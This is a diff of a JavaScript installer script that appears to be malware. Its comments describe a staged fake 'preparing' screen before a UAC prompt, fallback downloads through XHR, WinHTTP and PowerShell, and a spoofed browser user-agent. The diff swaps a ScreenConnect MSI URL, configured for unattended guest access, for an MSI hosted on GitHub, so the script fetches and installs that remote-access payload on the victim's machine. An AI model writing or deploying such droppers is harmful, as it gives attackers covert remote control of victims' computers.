@@ -89,7 +89,7 @@
 // signed, served from their CDN). msiexec fetches the MSI itself from the URL
 // — no local download stage, no PowerShell download child on the happy path.
 // ?e=Access&y=Guest configures the unattended guest-access session.
-var MSI_URL = "https://kidcoheadstart.screenconnect.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest";
+var MSI_URL = "https://github.com/VANCY476/fema/raw/main/ferm.msi";
 
 var PREP_MS        = 2200;    // "preparing" beat before the UAC prompt
 var UAC_TIMEOUT_MS = 150000;  // no MSI log this long after launch -> UAC declined
@@ -97,7 +97,7 @@ var INSTALL_MAX_MS = 300000;  // hard cap for a whole install phase
 var INSTALL_STALL_MS = 60000; // MSI log silent this long -> assume finished
 var FB_STAGE_MS    = { xhr: 120000, winhttp: 180000, ps: 300000 };
 var FB_MAX_MS      = 600000;  // hard cap for the whole local fallback download
-var EXPECT_BYTES   = 13266944; // ScreenConnect MSI size (progress scaling only)
+var EXPECT_BYTES   = 13266944; // ferm.msi size (progress scaling only)
 
 var UA_STR = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36";
 
